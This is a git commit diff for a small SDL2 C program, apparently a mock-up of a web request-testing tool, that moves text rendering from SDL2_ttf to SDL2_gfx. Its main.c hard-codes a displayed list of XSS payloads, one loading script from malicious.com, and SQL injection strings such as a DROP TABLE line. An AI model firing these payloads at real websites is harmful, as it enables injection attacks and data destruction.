bf1816fc57c61fd302de36d43ced435f26bf5c04
LoneSam <blakethefish@gmail.com>
2024-05-19 10:36:45 -0400

    added text

--- default.nix
+++ default.nix
@@ -4,13 +4,15 @@ pkgs.mkShell {
   buildInputs = [
     pkgs.gcc
     pkgs.SDL2
-    pkgs.SDL2_ttf
-    pkgs.pkg-config  # Updated from pkgconfig to pkg-config
+    pkgs.SDL2_gfx  # Using SDL2_gfx instead of SDL2_ttf
+    pkgs.pkg-config
     pkgs.makeWrapper
   ];
 
   shellHook = ''
-    export SDL2_TTF_LIBS="-L${pkgs.SDL2_ttf}/lib -lSDL2_ttf"
-    export SDL2_TTF_CFLAGS="-I${pkgs.SDL2_ttf}/include/SDL2"
+    export SDL2_LIBS="-L${pkgs.SDL2}/lib -lSDL2"
+    export SDL2_CFLAGS="-I${pkgs.SDL2}/include/SDL2"
+    export SDL2_GFX_LIBS="-L${pkgs.SDL2_gfx}/lib -lSDL2_gfx"
+    export SDL2_GFX_CFLAGS="-I${pkgs.SDL2_gfx}/include/SDL2"
   '';
 }
--- main.c
+++ main.c
@@ -1,32 +1,24 @@
 #include <SDL2/SDL.h>
-#include <SDL2/SDL_ttf.h>
+#include <SDL2/SDL2_gfxPrimitives.h>  // Include SDL2_gfx
 #include <stdbool.h>
 
 #define WINDOW_WIDTH 800
 #define WINDOW_HEIGHT 600
 
 void handleEvents(SDL_Event e, bool* quit, SDL_Rect buttonRect, SDL_Rect requestAllButtonRect);
-void renderText(SDL_Renderer* renderer, TTF_Font* font, const char* text, SDL_Rect* rect);
-void okPopup();
+void renderText(SDL_Renderer* renderer, const char* text, int x, int y, SDL_Color color);
 
 int main(int argc, char* argv[]) {
     SDL_Init(SDL_INIT_VIDEO);
-    TTF_Init();
 
     SDL_Window* window = SDL_CreateWindow("SDL GUI", SDL_WINDOWPOS_CENTERED, SDL_WINDOWPOS_CENTERED, WINDOW_WIDTH, WINDOW_HEIGHT, 0);
     SDL_Renderer* renderer = SDL_CreateRenderer(window, -1, SDL_RENDERER_ACCELERATED);
 
-    TTF_Font* font = TTF_OpenFont("arial.ttf", 16); // Ensure you have this font or change to one you have
-
-    // Define text boxes and button locations
-    SDL_Rect topLeftRect = {20, 20, 360, 280};
-    SDL_Rect bottomLeftRect = {20, 320, 360, 260};
     SDL_Rect buttonRect = {350, 270, 100, 50};
     SDL_Rect requestAllButtonRect = {350, 550, 100, 50};
 
-    // Define colors
     SDL_Color black = {0, 0, 0, 255};
-    SDL_Color blue = {0, 0, 255, 255};
+    SDL_Color white = {255, 255, 255, 255};
 
     bool quit = false;
     SDL_Event event;
@@ -39,24 +31,22 @@ int main(int argc, char* argv[]) {
         SDL_SetRenderDrawColor(renderer, 240, 240, 240, 255); // Light grey background
         SDL_RenderClear(renderer);
 
-        // Render GET request and payloads
-        renderText(renderer, font, "GET / HTTP/2.0\nHost: example.com", &topLeftRect);
-        renderText(renderer, font, "XSS Payloads:\n\"><script>alert(1)</script>\n<script>console.log('xss')</script>\n<script src='http://malicious.com/x.js'></script>\nSQL Injections:\n' OR '1'='1\n' OR 1=1--\n'; DROP TABLE users;", &bottomLeftRect);
+        // Render GET request and payloads with basic text rendering
+        renderText(renderer, "GET / HTTP/2.0\nHost: example.com", 20, 20, black);
+        renderText(renderer, "XSS Payloads:\n\"><script>alert(1)</script>\n<script>console.log('xss')</script>\n<script src='http://malicious.com/x.js'></script>\nSQL Injections:\n' OR '1'='1\n' OR 1=1--\n'; DROP TABLE users;", 20, 320, black);
 
         // Render buttons with text
-        SDL_SetRenderDrawColor(renderer, blue.r, blue.g, blue.b, blue.a);
+        SDL_SetRenderDrawColor(renderer, 0, 0, 255, 255); // Blue buttons
         SDL_RenderFillRect(renderer, &buttonRect);
         SDL_RenderFillRect(renderer, &requestAllButtonRect);
-        renderText(renderer, font, "Request", &buttonRect);
-        renderText(renderer, font, "Request All", &requestAllButtonRect);
+        renderText(renderer, "Request", 350 + 25, 270 + 15, white); // Center text manually
+        renderText(renderer, "Request All", 350 + 10, 550 + 15, white); // Center text manually
 
         SDL_RenderPresent(renderer);
     }
 
-    TTF_CloseFont(font);
     SDL_DestroyRenderer(renderer);
     SDL_DestroyWindow(window);
-    TTF_Quit();
     SDL_Quit();
     return 0;
 }
@@ -67,23 +57,14 @@ void handleEvents(SDL_Event e, bool* quit, SDL_Rect buttonRect, SDL_Rect request
     } else if (e.type == SDL_MOUSEBUTTONDOWN) {
         if ((e.button.x >= buttonRect.x && e.button.x <= buttonRect.x + buttonRect.w) &&
             (e.button.y >= buttonRect.y && e.button.y <= buttonRect.y + buttonRect.h)) {
-            okPopup();
+            printf("Clicked Request!\n");
         } else if ((e.button.x >= requestAllButtonRect.x && e.button.x <= requestAllButtonRect.x + requestAllButtonRect.w) &&
                    (e.button.y >= requestAllButtonRect.y && e.button.y <= requestAllButtonRect.y + requestAllButtonRect.h)) {
-            okPopup();
+            printf("Clicked Request All!\n");
         }
     }
 }
 
-void renderText(SDL_Renderer* renderer, TTF_Font* font, const char* text, SDL_Rect* rect) {
-    SDL_Color black = {0, 0, 0, 255};
-    SDL_Surface* surface = TTF_RenderText_Blended_Wrapped(font, text, black, rect->w);
-    SDL_Texture* texture = SDL_CreateTextureFromSurface(renderer, surface);
-    SDL_RenderCopy(renderer, texture, NULL, rect);
-    SDL_DestroyTexture(texture);
-    SDL_FreeSurface(surface);
-}
-
-void okPopup() {
-    printf("Clicked!\n"); // Ideally, use another method or library to create actual GUI popups.
+void renderText(SDL_Renderer* renderer, const char* text, int x, int y, SDL_Color color) {
+    stringRGBA(renderer, x, y, text, color.r, color.g, color.b, color.a);
 }
